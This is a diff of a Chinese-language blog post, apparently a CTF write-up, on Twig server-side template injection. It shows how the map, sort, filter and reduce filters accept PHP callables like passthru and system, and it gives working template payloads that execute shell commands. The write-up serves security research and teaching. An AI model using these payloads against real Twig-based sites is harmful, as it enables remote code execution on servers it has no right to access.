@@ -299,10 +299,8 @@
 <p><code>{{[&quot;man&quot;]|map((arg)=&gt;&quot;hello #{arg}&quot;)}}</code></p>
 <p>会被编译成</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">twig_array_map([<span class="number">0</span> =&gt; <span class="string">"id"</span>], <span class="function"><span class="keyword">function</span> <span class="params">($__arg__)</span> <span class="title">use</span> <span class="params">($context, $macros)</span> </span>&#123; $context[<span class="string">"arg"</span>] = $__arg__; <span class="keyword">return</span> (<span class="string">"hello "</span> . ($context[<span class="string">"arg"</span>] ?? <span class="keyword">null</span>))</span><br></pre></td></tr></table></figure>
-
 <p><code>map</code> 对应的函数是<code>twig_array_map</code> ,下面是其实现</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">twig_array_map</span><span class="params">($array, $arrow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $r = [];</span><br><span class="line">    <span class="keyword">foreach</span> ($array <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">        $r[$k] = $arrow($v, $k);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <p>从上面的代码我们可以看到，$arrow 是可控的，可以不传arrow function，可以只传一个字符串。所以我们需要找个两个参数的能够命令执行的危险函数即可。通过查阅常见的命令执行函数：</p>
 <ul>
 <li><blockquote>
@@ -339,40 +337,32 @@
 <p>下面通过调试来看一下传arrow fucntion 和 直接传字符串会有什么不同。</p>
 <p>(arg)=&gt;”hello #{arg}”`  会被解析成ArrowFunctionExpression，经过一些列处理会变成一个闭包函数。</p>
 <p><img src="https://cdn.jsdelivr.net/gh/waderwu/blog-img/2020/5/image-20200331155958489.png" alt="image-20200331155958489"></p>
-<p>但是如果我们传的是 ``{{[“id”]|map(“passthru”)}}<code></code>passthru` 会被解析成 ConstanExpression</p>
+<p>但是如果我们传的是 <code>`{{[&quot;id&quot;]|map(&quot;passthru&quot;)}}</code> <code>passthru</code> 会被解析成 ConstanExpression</p>
 <p><img src="https://cdn.jsdelivr.net/gh/waderwu/blog-img/2020/5/image-20200331160420542.png" alt="image-20200331160420542"></p>
 <p><code>{{[&quot;id&quot;]|map(&quot;passthru&quot;)}}</code> 最终会被编译成下面这样</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">twig_array_map([<span class="number">0</span> =&gt; <span class="string">"whoami"</span>], <span class="string">"passthru"</span>)</span><br></pre></td></tr></table></figure>
-
 <p>按照这个思路，我们去找$arrow 参数的， 可以发现下面几个filter也是可以利用的</p>
 <h3 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">twig_sort_filter</span><span class="params">($array, $arrow = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($array <span class="keyword">instanceof</span> \Traversable) &#123;</span><br><span class="line">        $array = iterator_to_array($array);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (!\is_array($array)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeError(sprintf(<span class="string">'The sort filter only works with arrays or "Traversable", got "%s".'</span>, \gettype($array)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">null</span> !== $arrow) &#123;</span><br><span class="line">        uasort($array, $arrow);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        asort($array);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <blockquote>
 <p>usort ( array <code>&amp;$array</code> , <a href="language.types.callable.html">callable</a> <code>$value_compare_func</code> ) : bool</p>
 </blockquote>
 <p><img src="https://cdn.jsdelivr.net/gh/waderwu/blog-img/2020/5/image-20200331164005226.png" alt="image-20200331164005226"></p>
 <p>所以我们可以构造</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{{[&quot;id&quot;, 0]|sort(&quot;passthru&quot;)}}</span><br></pre></td></tr></table></figure>
-
 <h3 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">twig_array_filter</span><span class="params">($array, $arrow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (\is_array($array)) &#123;</span><br><span class="line">        <span class="keyword">return</span> array_filter($array, $arrow, \ARRAY_FILTER_USE_BOTH);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// the IteratorIterator wrapping is needed as some internal PHP classes are \Traversable but do not implement \Iterator</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> \CallbackFilterIterator(<span class="keyword">new</span> \IteratorIterator($array), $arrow);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <blockquote>
 <p>array_filter ( array <code>$array</code> [, <a href="language.types.callable.html">callable</a> <code>$callback</code> [, int <code>$flag</code> = 0 ]] ) : array</p>
 </blockquote>
 <p>只需要传一个参数即可</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{{[&quot;id&quot;]|filter(&apos;system&apos;)}}</span><br></pre></td></tr></table></figure>
-
 <h3 id="reduce"><a href="#reduce" class="headerlink" title="reduce"></a>reduce</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">twig_array_reduce</span><span class="params">($array, $arrow, $initial = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!\is_array($array)) &#123;</span><br><span class="line">        $array = iterator_to_array($array);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> array_reduce($array, $arrow, $initial);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <blockquote>
 <p>array_reduce ( array <code>$array</code> , <a href="language.types.callable.html">callable</a> <code>$callback</code> [, <a href="language.pseudo-types.html#language.types.mixed">mixed</a> <code>$initial</code> = <strong><code>NULL</code></strong> ] ) : <a href="language.pseudo-types.html#language.types.mixed">mixed</a></p>
 </blockquote>
 <p>刚开始构造还是像前面那样构造成了</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{{[&quot;id&quot;, 0]|reduce(&quot;passthru&quot;)}}</span><br></pre></td></tr></table></figure>
-
 <p>但是会发现没有执行成功，是因为第一次调用的是<code>passthru($initial, &quot;id&quot;)</code>, <code>$initial</code> 是null，所以会失败。所以把<code>$initial</code> 赋值成要执行的命令即可</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{{[0, 0]|reduce(&quot;passthru&quot;, &quot;id&quot;)}}</span><br></pre></td></tr></table></figure>
-
 <p>不知道有没有自动化fuzz，把php允许有callback参数的所有函数找出来，如果有师傅研究过，欢迎来交流。</p>
 <h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
 <li><a href="https://cyku.tw/volgactf-2020-qualifier/" target="_blank" rel="noopener">https://cyku.tw/volgactf-2020-qualifier/</a></li>
@@ -589,6 +579,8 @@
 
 
 
+
+  
 
   
 
